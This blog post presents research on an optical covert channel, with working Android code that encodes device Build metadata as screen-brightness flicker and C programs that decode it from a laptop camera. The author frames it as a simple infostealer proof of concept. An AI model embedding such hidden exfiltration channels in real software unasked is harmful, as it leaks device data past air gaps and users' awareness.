---
title: "Optical recon over light - part 2. Android Build metadata. Simple Kotlin and C example"
date: 2026-11-18 22:00:00 +0300
header:
  teaser: "/assets/images/236/photo_2026-11-23_02-50-34.jpg"
categories:
  - research
tags:
  - android
  - malware
  - linux
  - math
  - physics
  - signal processing
  - optical
  - blue team
---

﷽

Hello, cybersecurity enthusiasts and white hackers!

![malware](/assets/images/236/photo_2026-11-23_02-50-34.jpg){:class="img-responsive"}    

In [part 1](/research/2026/11/14/physical-covert-channels-1.html), I sent a fixed `MEOW` identifier from an Android screen to a Linux receiver. In this part, I use the same ReconCat interface and gray signal area to send a JSON snapshot made from Android Build fields. The user taps **Meow! ♥️** to start; the C receiver recovers the text, checks it, and saves it as JSON.

[Part 1](/research/2026/11/14/physical-covert-channels-1.html) already confirmed the physical Android-screen-to-ThinkPad-camera-to-Linux path: the camera recording decoded the `59`-second `MEOW` frame, passed CRC `0x0ead`, and printed `Meow-meow!`. This part expands the payload to the Build JSON and uses a shorter half-bit to keep the transfer practical, so that longer frame still needs its own complete camera decode.   

The snapshot contains manufacturer, model, device, brand, hardware, board, build type, primary ABI, and Android SDK level, matching the fields in my DSP recon PoC. The app requests no Android permissions and declares no `INTERNET` permission. For simplicity of PoC, it does not read a serial number, IMEI, Android ID, location, contacts, or files.    

### the channel and concept

The transmitter and receiver are:

```bash
Android Build.* -> JSON -> Manchester frame -> screen brightness
                                           |
                                           v
ThinkPad camera -> grayscale frames -> central ROI sampler in C -> C decoder -> JSON file
```

The gray patch remains in the same place in the interface. The cat, plot, title, and button stay visible; only the patch carries the timed data. The Linux pipeline no longer needs a manually chosen crop rectangle. FFmpeg decodes the video and produces `640x480` grayscale frames; a small C program averages a fixed `48x48` region at the center of each frame and passes one sample per frame to the receiver.

The phone must be positioned so that the gray patch itself covers the camera image's center. Centering the phone body is not enough if the patch falls outside that central square.

### Build fields and frame

When **Meow! ♥️** is tapped, the app reads the current values from Android's Build API and serializes these nine fields:

```kotlin
- manufacturer: Build.MANUFACTURER
- model: Build.MODEL
- device: Build.DEVICE
- brand: Build.BRAND
- hardware: Build.HARDWARE
- board: Build.BOARD
- type: Build.TYPE
- arch: Build.SUPPORTED_ABIS[0]
- sdk: Build.VERSION.SDK_INT
```

The payload is UTF-8 JSON and is limited to `256` bytes. If the current values exceed that limit, the app stops before transmitting. The frame is:    

```bash
AA AA AA AA D3 91 | length (16-bit BE) | UTF-8 JSON | XOR(JSON) | CRC32 (32-bit BE)
 preamble + sync
```

Bytes are sent most significant bit first. CRC32/IEEE covers the two length bytes, JSON and XOR byte; the receiver checks both XOR and CRC32 before writing the output file. CRC detects accidental corruption. It does not authenticate or encrypt the data.

### mathematical model and timing

The Android app selects a gray level $$u(t)\in\{80,128,176\}$$. Gray $$128$$ is the idle and guard level. Manchester bits use levels 80 and 176:

```bash
bit 0: 80 -> 176
bit 1: 176 -> 80
          167 ms per half-bit
```

Let the grayscale camera frame be $$I_k(x,y)$$, and let $$R$$ be the 48 by 48 square at its center. The C sampler turns each video frame into one value:

$$
z_k = \frac{1}{\lvert R\rvert}\sum_{(x,y)\in R} I_k(x,y), \qquad \lvert R\rvert=48^2.
$$

For a transmitted bit, the receiver averages samples from the central 60 percent of each half and computes

$$
D_i = \bar z_{i,0} - \bar z_{i,1}.
$$

With the mapping above, $$D_i$$ is positive for bit `1` and negative for bit `0`. If the noiseless light and dark means differ by $$\Delta$$ and the error in each half-window is bounded by $$\eta$$, then the decision sign is preserved when $$\Delta>2\eta$$. This implementation also rejects a pair when $$\lvert D_i\rvert$$ is below 6 gray levels, so a sufficient condition for acceptance with the correct sign is

$$
\Delta > 6 + 2\eta.
$$

This is a sufficient condition for the decoder's decision, not a measurement of my ThinkPad camera. Part 1 decoded the physical 250 ms frame with an estimated 0.2490 s half-bit. This part uses 167 ms halves, so the new timing and longer frame must be checked against a fresh camera recording.

The camera stream is normalized to $$f_s=30$$ samples per second. With a half-bit duration $$T_h=0.167\,\mathrm{s}$$, the nominal number of samples per half is

$$
N_h = f_s T_h = 30 \cdot 0.167 \approx 5.01.
$$

The receiver searches half-bit durations from 4.70 through 5.30 samples and scans the start phase one sample at a time. It averages the central 60 percent of each half to avoid the transition. A sufficient timing condition for those windows to remain inside the transmitted halves is

$$
\lvert e_j\rvert + \frac{T_e}{2} + T_r + T_d < 0.2 T_h = 33.4\text{ ms},
$$

where $$e_j$$ is the sample-center error, $$T_e$$ is camera exposure, $$T_r$$ bounds display response, and $$T_d$$ includes capture and resampling error. The implementation searches a constant-rate range; it does not read the camera's exposure or prove that this inequality holds. That is why the webcam recording is part of the experiment.

For a JSON payload of $$L$$ bytes, a frame contains $$N=L+13$$ bytes: six preamble/sync bytes, two length bytes, $$L$$ payload bytes, one XOR byte and four CRC bytes. Each byte has $$16$$ Manchester half-bits. With five seconds of leading guard and two seconds of trailing guard, the transmission duration is

$$
\begin{aligned}
T_{\mathrm{total}} &= 7 + 16(L+13)T_h \\
                   &= 7 + 2.672(L+13)\ \mathrm{s}.
\end{aligned}
$$

The payload limit of `256` bytes gives a maximum frame duration of `725.768` seconds. The app calculates and displays the duration for the actual device snapshot when transmission starts. The raw and useful payload rates are     

$$
\begin{aligned}
R_{\mathrm{raw}} &= \frac{1}{2T_h} \approx 2.99\text{ bits/s}, \\
R_{\mathrm{useful}} &= \frac{8L}{T_{\mathrm{total}}}.
\end{aligned}
$$

CRC32/IEEE uses the reflected polynomial `0xedb88320`, initial value `0xffffffff` and final XOR `0xffffffff`. A standard check value for ASCII `123456789` is `0xcbf43926`. The JSON data is accepted only if both the XOR and CRC32 match.    

### practical example 1. Android transmitter

The Build snapshot is gathered when the user taps the button, rather than being hard-coded into the app:

```java
package lab.opticalmeow;

import android.os.Build;
import org.json.JSONException;
import org.json.JSONObject;

final class DeviceRecon {
    private DeviceRecon() { }

    static String snapshotJson() {
        JSONObject info = new JSONObject();
        try {
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("model", Build.MODEL);
            info.put("device", Build.DEVICE);
            info.put("brand", Build.BRAND);
            info.put("hardware", Build.HARDWARE);
            info.put("board", Build.BOARD);
            info.put("type", Build.TYPE);
            info.put("arch", Build.SUPPORTED_ABIS.length > 0
                    ? Build.SUPPORTED_ABIS[0] : "unknown");
            info.put("sdk", Build.VERSION.SDK_INT);
        } catch (JSONException e) {
            throw new IllegalStateException("could not serialize Build fields", e);
        }
        return info.toString();
    }
}
```

The frame builder writes a 16-bit big-endian length, copies the UTF-8 JSON, calculates XOR over that JSON, then calculates CRC32 over the length and data checks. The screen encoder maps each frame bit to two `167 ms` gray levels. I decided not to update the application from the first part, but to create a new one with the same frontend but updated logic. So, the new app uses a separate Android application ID; the Part 1 APK and source remain unchanged.    

The full transmitter activity is below. `SignalPlotView` and the cat artwork are unchanged from my previous app from Part 1. **A long time ago, designers drew these and you were looking for a friend for perfect "frontending" and designing for your work. Nowadays, I can only thank Codex or Claude (sad, but true)**:

```java
package lab.opticalmeow;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.view.Gravity;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.nio.charset.StandardCharsets;
import java.util.zip.CRC32;

public final class OpticalActivity extends Activity {
    private static final long GUARD_MS = 5000;
    private static final long TRAILER_MS = 2000;
    private static final long HALF_MS = 167;
    private static final int MAX_PAYLOAD = 256;
    private static final int[] SYNC = {0xaa, 0xaa, 0xaa, 0xaa, 0xd3, 0x91};

    private final Handler main = new Handler(Looper.getMainLooper());
    private View signal;
    private Button transmit;
    private TextView status;
    private TextView payloadInfo;
    private SignalPlotView plot;
    private byte[] frame;
    private long started;
    private long durationMs;
    private long lastHalf = -1;
    private boolean sending;
    private int previousGray = -1;

    private final Runnable updateSignal = new Runnable() {
        @Override public void run() {
            if (!sending) return;
            long elapsed = SystemClock.elapsedRealtime() - started;
            if (elapsed >= durationMs) {
                finishSignal("Frame sent. Check the C receiver.");
                return;
            }
            if (elapsed >= GUARD_MS && elapsed < durationMs - TRAILER_MS) {
                long half = (elapsed - GUARD_MS) / HALF_MS;
                if ((lastHalf < 0 && half != 0) || (lastHalf >= 0 && half > lastHalf + 1)) {
                    finishSignal("Timing gap. Tap Meow! to retry.");
                    return;
                }
                lastHalf = half;
            }
            int gray = grayAt(elapsed);
            if (gray != previousGray) {
                signal.setBackgroundColor(Color.rgb(gray, gray, gray));
                plot.addLevel(gray);
                previousGray = gray;
            }
            main.postDelayed(this, 8);
        }
    };

    @Override public void onCreate(Bundle state) {
        super.onCreate(state);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        WindowManager.LayoutParams params = getWindow().getAttributes();
        params.screenBrightness = 0.8f;
        getWindow().setAttributes(params);

        LinearLayout page = new LinearLayout(this);
        page.setOrientation(LinearLayout.VERTICAL);
        page.setGravity(Gravity.CENTER_HORIZONTAL | Gravity.CENTER_VERTICAL);
        page.setPadding(dp(20), dp(40), dp(20), dp(14));
        page.setBackgroundColor(Color.rgb(11, 16, 32));

        TextView eyebrow = new TextView(this);
        eyebrow.setText("RECONCAT  /  OPTICAL");
        eyebrow.setTextColor(Color.rgb(105, 220, 213));
        eyebrow.setTextSize(12);
        eyebrow.setLetterSpacing(0.08f);
        page.addView(eyebrow, centered(LinearLayout.LayoutParams.WRAP_CONTENT, dp(22)));

        TextView title = new TextView(this);
        title.setText("Meow over light");
        title.setTextColor(Color.WHITE);
        title.setTextSize(27);
        title.setGravity(Gravity.CENTER);
        page.addView(title, centered(LinearLayout.LayoutParams.WRAP_CONTENT, dp(38)));

        TextView subtitle = new TextView(this);
        subtitle.setText("Android  ->  ThinkPad camera  ->  C receiver");
        subtitle.setTextColor(Color.rgb(174, 187, 207));
        subtitle.setTextSize(13);
        page.addView(subtitle, centered(LinearLayout.LayoutParams.WRAP_CONTENT, dp(24)));

        ImageView cat = new ImageView(this);
        cat.setImageResource(R.drawable.cat);
        cat.setScaleType(ImageView.ScaleType.FIT_CENTER);
        LinearLayout.LayoutParams catParams = centered(dp(144), dp(144));
        catParams.topMargin = dp(8);
        page.addView(cat, catParams);

        payloadInfo = new TextView(this);
        payloadInfo.setText("PAYLOAD   Build.*     •     MANCHESTER     •     CRC-32");
        payloadInfo.setTextColor(Color.rgb(211, 219, 234));
        payloadInfo.setTextSize(11);
        payloadInfo.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams payloadParams = centered(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(32));
        payloadParams.topMargin = dp(8);
        page.addView(payloadInfo, payloadParams);

        signal = new View(this);
        signal.setBackgroundColor(Color.rgb(128, 128, 128));
        signal.setContentDescription("Optical signal patch");
        LinearLayout.LayoutParams signalParams = centered(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(220));
        page.addView(signal, signalParams);

        plot = new SignalPlotView(this);
        plot.setBackground(roundRect(Color.rgb(22, 31, 48), dp(14)));
        LinearLayout.LayoutParams plotParams = centered(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(54));
        plotParams.topMargin = dp(10);
        page.addView(plot, plotParams);

        status = new TextView(this);
        status.setText("Aim the camera at the gray patch, then tap Meow!");
        status.setTextColor(Color.rgb(174, 187, 207));
        status.setTextSize(13);
        status.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams statusParams = centered(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(34));
        statusParams.topMargin = dp(8);
        page.addView(status, statusParams);

        transmit = new Button(this);
        transmit.setText("Meow! ♥️");
        transmit.setAllCaps(false);
        transmit.setTextColor(Color.WHITE);
        transmit.setTextSize(18);
        transmit.setBackground(roundRect(Color.rgb(238, 91, 133), dp(24)));
        LinearLayout.LayoutParams buttonParams = centered(
                LinearLayout.LayoutParams.MATCH_PARENT, dp(54));
        buttonParams.topMargin = dp(6);
        page.addView(transmit, buttonParams);
        transmit.setOnClickListener(v -> startSignal());

        setContentView(page);
        page.post(this::hideSystemBars);
    }

    private LinearLayout.LayoutParams centered(int width, int height) {
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(width, height);
        params.gravity = Gravity.CENTER_HORIZONTAL;
        return params;
    }

    private int dp(int value) {
        return (int) (value * getResources().getDisplayMetrics().density + 0.5f);
    }

    private GradientDrawable roundRect(int color, int radius) {
        GradientDrawable shape = new GradientDrawable();
        shape.setColor(color);
        shape.setCornerRadius(radius);
        return shape;
    }

    @SuppressWarnings("deprecation")
    private void hideSystemBars() {
        if (Build.VERSION.SDK_INT >= 30) {
            WindowInsetsController controller = getWindow().getInsetsController();
            if (controller != null) {
                controller.hide(WindowInsets.Type.statusBars() | WindowInsets.Type.navigationBars());
                controller.setSystemBarsBehavior(
                        WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
            }
        } else {
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        }
    }

    private void startSignal() {
        byte[] payload = DeviceRecon.snapshotJson().getBytes(StandardCharsets.UTF_8);
        if (payload.length == 0 || payload.length > MAX_PAYLOAD) {
            status.setText("Build snapshot is too large (max 256 bytes).");
            return;
        }
        frame = makeFrame(payload);
        durationMs = GUARD_MS + TRAILER_MS + frame.length * 16L * HALF_MS;
        sending = true;
        lastHalf = -1;
        previousGray = -1;
        started = SystemClock.elapsedRealtime();
        transmit.setEnabled(false);
        transmit.setText("Sending Build.*...");
        payloadInfo.setText("PAYLOAD   " + payload.length + " bytes     •     CRC-32");
        status.setText("Sending " + payload.length + " bytes   •   "
                + Math.round(durationMs / 1000.0) + " s");
        plot.clear();
        main.removeCallbacks(updateSignal);
        main.post(updateSignal);
    }

    private int grayAt(long elapsedMs) {
        long dataMs = elapsedMs - GUARD_MS;
        if (dataMs < 0 || dataMs >= frame.length * 16L * HALF_MS) return 128;
        long half = dataMs / HALF_MS;
        long bit = half / 2;
        int value = (frame[(int) (bit / 8)] >> (7 - (bit & 7))) & 1;
        boolean light = (half & 1) == 0 ? value == 1 : value == 0;
        return light ? 176 : 80;
    }

    private byte[] makeFrame(byte[] payload) {
        byte[] result = new byte[SYNC.length + 2 + payload.length + 1 + 4];
        for (int i = 0; i < SYNC.length; i++) result[i] = (byte) SYNC[i];
        result[SYNC.length] = (byte) (payload.length >>> 8);
        result[SYNC.length + 1] = (byte) payload.length;
        System.arraycopy(payload, 0, result, SYNC.length + 2, payload.length);
        int xor = 0;
        for (byte value : payload) xor ^= value & 0xff;
        result[SYNC.length + 2 + payload.length] = (byte) xor;
        CRC32 crc = new CRC32();
        crc.update(result, SYNC.length, 2 + payload.length + 1);
        long value = crc.getValue();
        for (int i = 0; i < 4; i++)
            result[result.length - 4 + i] = (byte) (value >>> (24 - 8 * i));
        return result;
    }

    private void finishSignal(String message) {
        sending = false;
        main.removeCallbacks(updateSignal);
        signal.setBackgroundColor(Color.rgb(128, 128, 128));
        status.setText(message);
        transmit.setEnabled(true);
        transmit.setText("Meow! ♥️");
    }

    @Override protected void onPause() {
        if (sending) finishSignal("Transmission stopped. Tap Meow! ♥️ to retry.");
        super.onPause();
    }

    @Override protected void onDestroy() {
        main.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
```

![malware](/assets/images/236/reconcat-optical-recon.png){:class="img-responsive"}

### practical example 2. C receiver and center sampler

I keep compressed-video decoding in FFmpeg. The C program handles the part specific to this experiment: for each raw 640x480 grayscale frame, it averages the central 48x48 pixels and emits one byte. This removes manual crop coordinates and image inspection from the receive command. The sampler does not search the whole image for a phone; the phone's gray patch must be placed over the frame center.

The central ROI starts at `x = (640 - 48)/2 = 296` and `y = (480 - 48)/2 = 216`. The same C program accepts other frame sizes and ROI sizes from its command line.     

```c
/*
 * center-sample.c - average the central camera ROI from raw grayscale frames
 * author: @cocomelonc
 * gcc -std=c11 -O2 -Wall -Wextra -Wpedantic -Werror center-sample.c -o center-sample
 */
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

static int positive_int(const char *text, int *value) {
  char *end = NULL;
  errno = 0;
  long parsed = strtol(text, &end, 10);
  if (errno || end == text || *end != '\0' || parsed < 1 || parsed > 8192) return 0;
  *value = (int)parsed;
  return 1;
}

int main(int argc, char **argv) {
  if (argc < 3 || argc > 4) {
    fprintf(stderr, "usage: %s width height [roi-size]\n", argv[0]);
    return 2;
  }
  int width, height, roi_size = 48;
  if (!positive_int(argv[1], &width) || !positive_int(argv[2], &height)
      || (argc == 4 && !positive_int(argv[3], &roi_size))) {
    fprintf(stderr, "[=^..^=] dimensions and ROI must be integers from 1 to 8192\n");
    return 2;
  }
  if (roi_size > width || roi_size > height
      || (size_t)width > SIZE_MAX / (size_t)height) {
    fprintf(stderr, "[=^..^=] ROI does not fit the frame or frame is too large\n");
    return 2;
  }
  size_t frame_size = (size_t)width * (size_t)height;
  uint8_t *frame = malloc(frame_size);
  if (!frame) {
    fprintf(stderr, "[=^..^=] could not allocate one grayscale frame\n");
    return 2;
  }
  size_t x0 = ((size_t)width - (size_t)roi_size) / 2;
  size_t y0 = ((size_t)height - (size_t)roi_size) / 2;
  uint64_t roi_pixels = (uint64_t)roi_size * (uint64_t)roi_size;
  uint64_t frames = 0;
  setvbuf(stdout, NULL, _IOFBF, 65536);
  for (;;) {
    size_t got = fread(frame, 1, frame_size, stdin);
    if (got == 0) {
      if (ferror(stdin)) {
        perror("stdin");
        free(frame);
        return 1;
      }
      break;
    }
    if (got != frame_size) {
      fprintf(stderr, "[=^..^=] incomplete final video frame (%zu of %zu bytes)\n",
              got, frame_size);
      free(frame);
      return 1;
    }
    uint64_t total = 0;
    for (int y = 0; y < roi_size; y++) {
      size_t row = (y0 + (size_t)y) * (size_t)width + x0;
      for (int x = 0; x < roi_size; x++) total += frame[row + (size_t)x];
    }
    int sample = (int)((total + roi_pixels / 2) / roi_pixels);
    if (fputc(sample, stdout) == EOF) {
      perror("stdout");
      free(frame);
      return 1;
    }
    frames++;
  }
  free(frame);
  if (frames == 0) {
    fprintf(stderr, "[=^..^=] no video frames received\n");
    return 1;
  }
  if (fflush(stdout) != 0) {
    perror("stdout");
    return 1;
  }
  fprintf(stderr, "[=^..^=] sampled %llu frames; center ROI %dx%d at (%zu,%zu)\n",
          (unsigned long long)frames, roi_size, roi_size, x0, y0);
  return 0;
}
```

The receiver makes a prefix sum of the grayscale samples so each half-window mean is constant-time to calculate. It searches for the six-byte synchronization sequence, reads the two-byte length, rejects lengths above 256, checks XOR and CRC32, and writes the payload only after both checks pass. The received bytes stay data; the program does not map or execute them.

```c
/*
 * receiver-recon.c - optical Build.* JSON receiver, 30 grayscale samples/s
 * author: @cocomelonc
 * gcc -std=c11 -O2 -Wall -Wextra -Wpedantic -Werror receiver-recon.c -o receiver-recon -lm
 */
#include <math.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_PAYLOAD 256
#define MAX_FRAME (MAX_PAYLOAD + 13)
#define MAX_SAMPLES (30 * 900)

static uint32_t crc32_ieee(const uint8_t *data, size_t length) {
  uint32_t crc = 0xffffffffu;
  for (size_t i = 0; i < length; i++) {
    crc ^= data[i];
    for (int bit = 0; bit < 8; bit++)
      crc = (crc & 1u) ? (crc >> 1) ^ 0xedb88320u : crc >> 1;
  }
  return crc ^ 0xffffffffu;
}

static int byte_at(const double *sum, size_t n, double start,
                   double half, int byte) {
  int value = 0;
  for (int bit = 0; bit < 8; bit++) {
    double means[2];
    for (int h = 0; h < 2; h++) {
      double pos = start + (byte * 16 + bit * 2 + h) * half;
      size_t lo = (size_t)ceil(pos + 0.2 * half);
      size_t hi = (size_t)ceil(pos + 0.8 * half);
      if (hi > n || hi <= lo) return -1;
      means[h] = (sum[hi] - sum[lo]) / (double)(hi - lo);
    }
    if (fabs(means[0] - means[1]) < 6.0) return -1;
    value = (value << 1) | (means[0] > means[1]);
  }
  return value;
}

static int save_payload(const char *path, const uint8_t *payload, size_t length) {
  FILE *out = fopen(path, "wb");
  if (!out) {
    perror(path);
    return 0;
  }
  int ok = fwrite(payload, 1, length, out) == length;
  if (fclose(out) != 0) ok = 0;
  if (!ok) fprintf(stderr, "[=^..^=] could not write the complete JSON payload\n");
  return ok;
}

int main(int argc, char **argv) {
  if (argc != 3) {
    fprintf(stderr, "usage: %s samples.u8|− recovered.json\n", argv[0]);
    return 2;
  }
  FILE *input = strcmp(argv[1], "-") == 0 ? stdin : fopen(argv[1], "rb");
  if (!input) {
    perror(argv[1]);
    return 2;
  }
  uint8_t *raw = malloc(MAX_SAMPLES + 1);
  if (!raw) {
    fprintf(stderr, "[=^..^=] out of memory\n");
    if (input != stdin) fclose(input);
    return 2;
  }
  size_t n = fread(raw, 1, MAX_SAMPLES + 1, input);
  int read_error = ferror(input);
  if (input != stdin) fclose(input);
  if (read_error || n > MAX_SAMPLES) {
    fprintf(stderr, "[=^..^=] input error or longer than 15 minutes at 30 samples/s\n");
    free(raw);
    return 2;
  }
  if (n < 300) {
    fprintf(stderr, "[=^..^=] capture is too short\n");
    free(raw);
    return 1;
  }
  double *sum = calloc(n + 1, sizeof(*sum));
  if (!sum) {
    fprintf(stderr, "[=^..^=] out of memory\n");
    free(raw);
    return 2;
  }
  for (size_t i = 0; i < n; i++) sum[i + 1] = sum[i] + raw[i];
  free(raw);

  const uint8_t sync[6] = {0xaa, 0xaa, 0xaa, 0xaa, 0xd3, 0x91};
  for (int tick = 470; tick <= 530; tick++) {
    double half = tick / 100.0;
    for (size_t start = 0; start < n; start++) {
      uint8_t frame[MAX_FRAME];
      int ok = 1;
      for (int i = 0; i < 6; i++) {
        int value = byte_at(sum, n, (double)start, half, i);
        if (value != sync[i]) {
          ok = 0;
          break;
        }
        frame[i] = (uint8_t)value;
      }
      if (!ok) continue;

      int high = byte_at(sum, n, (double)start, half, 6);
      int low = byte_at(sum, n, (double)start, half, 7);
      if (high < 0 || low < 0) continue;
      size_t length = ((size_t)high << 8) | (size_t)low;
      if (length == 0 || length > MAX_PAYLOAD) continue;
      size_t frame_length = length + 13;
      frame[6] = (uint8_t)high;
      frame[7] = (uint8_t)low;
      for (size_t i = 8; i < frame_length; i++) {
        int value = byte_at(sum, n, (double)start, half, (int)i);
        if (value < 0) {
          ok = 0;
          break;
        }
        frame[i] = (uint8_t)value;
      }
      if (!ok) continue;

      uint8_t checksum = 0;
      for (size_t i = 0; i < length; i++) checksum ^= frame[8 + i];
      if (checksum != frame[8 + length]) continue;
      size_t crc_length = length + 3;
      uint32_t expected = crc32_ieee(frame + 6, crc_length);
      size_t crc_offset = 9 + length;
      uint32_t received = ((uint32_t)frame[crc_offset] << 24)
                        | ((uint32_t)frame[crc_offset + 1] << 16)
                        | ((uint32_t)frame[crc_offset + 2] << 8)
                        | (uint32_t)frame[crc_offset + 3];
      if (received != expected) continue;

      if (!save_payload(argv[2], frame + 8, length)) {
        free(sum);
        return 2;
      }
      printf("[=^..^=] valid XOR and CRC32 0x%08x; %zu bytes; start %.2f s; half %.4f s\n",
             received, length, start / 30.0, half / 30.0);
      printf("[=^..^=] recovered Build.* JSON: ");
      if (fwrite(frame + 8, 1, length, stdout) != length) {
        perror("stdout");
        free(sum);
        return 2;
      }
      putchar('\n');
      free(sum);
      return 0;
    }
  }
  fprintf(stderr, "[=^..^=] no valid frame; check center ROI, exposure, timing and full capture\n");
  free(sum);
  return 1;
}
```

The separate C trace generator can turn an existing JSON file into ideal `30 Hz` Manchester samples. It is useful for replaying the exact JSON recovered from a camera run; it does not create or claim a physical measurement.     

```c
/*
 * trace-recon.c - generate a software-only Manchester trace from JSON bytes
 * author: @cocomelonc
 * gcc -std=c11 -O2 -Wall -Wextra -Wpedantic -Werror trace-recon.c -o trace-recon
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define MAX_PAYLOAD 256
#define GUARD_MS 5000
#define TRAILER_MS 2000
#define HALF_MS 167
#define SAMPLE_RATE 30

static uint32_t crc32_ieee(const uint8_t *data, size_t length) {
  uint32_t crc = 0xffffffffu;
  for (size_t i = 0; i < length; i++) {
    crc ^= data[i];
    for (int bit = 0; bit < 8; bit++)
      crc = (crc & 1u) ? (crc >> 1) ^ 0xedb88320u : crc >> 1;
  }
  return crc ^ 0xffffffffu;
}

static int gray_at(const uint8_t *frame, size_t frame_length, size_t sample) {
  size_t guard_samples = (size_t)GUARD_MS * SAMPLE_RATE / 1000;
  size_t data_samples = frame_length * 16 * (size_t)HALF_MS * SAMPLE_RATE / 1000;
  if (sample < guard_samples || sample >= guard_samples + data_samples) return 128;
  size_t elapsed_sample = sample - guard_samples;
  size_t half = elapsed_sample * 1000 / (SAMPLE_RATE * (size_t)HALF_MS);
  size_t bit = half / 2;
  int value = (frame[bit / 8] >> (7 - bit % 8)) & 1;
  int light = (half & 1) ? !value : value;
  return light ? 176 : 80;
}

int main(int argc, char **argv) {
  if (argc != 3) {
    fprintf(stderr, "usage: %s payload.json output.u8\n", argv[0]);
    return 2;
  }
  FILE *input = fopen(argv[1], "rb");
  if (!input) {
    perror(argv[1]);
    return 2;
  }
  uint8_t payload[MAX_PAYLOAD + 1];
  size_t length = fread(payload, 1, sizeof(payload), input);
  int read_error = ferror(input);
  fclose(input);
  if (read_error || length == 0 || length > MAX_PAYLOAD) {
    fprintf(stderr, "[=^..^=] JSON input must be 1..256 bytes\n");
    return 2;
  }
  uint8_t frame[MAX_PAYLOAD + 13];
  const uint8_t sync[6] = {0xaa, 0xaa, 0xaa, 0xaa, 0xd3, 0x91};
  for (int i = 0; i < 6; i++) frame[i] = sync[i];
  frame[6] = (uint8_t)(length >> 8);
  frame[7] = (uint8_t)length;
  for (size_t i = 0; i < length; i++) frame[8 + i] = payload[i];
  uint8_t checksum = 0;
  for (size_t i = 0; i < length; i++) checksum ^= payload[i];
  frame[8 + length] = checksum;
  uint32_t crc = crc32_ieee(frame + 6, length + 3);
  size_t crc_offset = 9 + length;
  frame[crc_offset] = (uint8_t)(crc >> 24);
  frame[crc_offset + 1] = (uint8_t)(crc >> 16);
  frame[crc_offset + 2] = (uint8_t)(crc >> 8);
  frame[crc_offset + 3] = (uint8_t)crc;
  size_t frame_length = length + 13;
  size_t duration_ms = GUARD_MS + TRAILER_MS + frame_length * 16 * HALF_MS;
  size_t samples = duration_ms * SAMPLE_RATE / 1000;

  FILE *output = fopen(argv[2], "wb");
  if (!output) {
    perror(argv[2]);
    return 2;
  }
  for (size_t i = 0; i < samples; i++) {
    if (fputc(gray_at(frame, frame_length, i), output) == EOF) {
      perror("trace write");
      fclose(output);
      return 1;
    }
  }
  if (fclose(output) != 0) {
    perror("trace close");
    return 1;
  }
  fprintf(stderr, "[=^..^=] software trace: %zu payload bytes, CRC32 0x%08x, %.1f s; no display or camera used\n",
          length, crc, duration_ms / 1000.0);
  return 0;
}
```

### demo setup

First of all, build the separate Android app and C programs. As I mention, again, these commands do not modify or rebuild the Part 1 app:     

```bash
cd android-recon
./gradlew --offline assembleDebug
```

![malware](/assets/images/236/2026-11-23_01-46.png){:class="img-responsive"}    

![malware](/assets/images/236/2026-11-23_01-46_1.png){:class="img-responsive"}    

install on my Motorola:    

```bash
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

![malware](/assets/images/236/2026-11-23_01-48.png){:class="img-responsive"}    

Compile camera ROI:     

```bash
gcc -std=c11 -O2 -Wall -Wextra -Wpedantic -Werror center-sample.c -o center-sample
```

![malware](/assets/images/236/2026-11-23_01-54.png){:class="img-responsive"}    

Compile receiver:    

```bash
gcc -std=c11 -O2 -Wall -Wextra -Wpedantic -Werror receiver-recon.c -o receiver-recon -lm
```

![malware](/assets/images/236/2026-11-23_01-55.png){:class="img-responsive"}    

and compile Manchester trace:     

```bash
gcc -std=c11 -O2 -Wall -Wextra -Wpedantic -Werror trace-recon.c -o trace-recon
```

![malware](/assets/images/236/2026-11-23_01-56.png){:class="img-responsive"}    

The new APK has a separate application ID, so it can be installed alongside ReconCat Optical. And, of course, for the purity of our air gap transmit experiment, its manifest has no uses-permission entries, and we no need INTERNET or network connection etc.           

### demo 1. record and decode the Build snapshot (simple simple infostealer)

Before recording, secure the phone on a stand or another stable support. Aim the ThinkPad camera so the gray patch covers the center of the frame. The C sampler reads a fixed central `48x48` ROI; it does not search for the phone or move the crop. Keep the phone fixed there for the whole transmission.     

Preview the camera with a green outline around that same central ROI. Adjust the phone until the outline is fully inside the gray patch, then press `q` to close `ffplay` before starting the recording; both programs need the camera device:

```bash
ffplay -f v4l2 -input_format mjpeg -framerate 30 -video_size 640x480 -vf 'drawbox=x=(iw-48)/2:y=(ih-48)/2:w=48:h=48:color=lime:t=2' /dev/video0
```

![malware](/assets/images/236/2026-11-23_02-21.png){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-23-05.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-23-21.jpg){:class="img-responsive"}    

![malware](/assets/images/236/photo_2026-11-23_02-23-25.jpg){:class="img-responsive"}    

The ThinkPad camera supports `640x480` at `30` frames per second. Start a `13`-minute capture; this covers the maximum `256`-byte frame plus time to press the phone button. Use the camera device and format reported by `v4l2-ctl` if your device differs:      

```bash
ffmpeg -f v4l2 -input_format mjpeg -framerate 30 -video_size 640x480 -i /dev/video0 -t 780 -an -c:v libx264 -preset ultrafast -crf 18 capture-part2.mp4
```

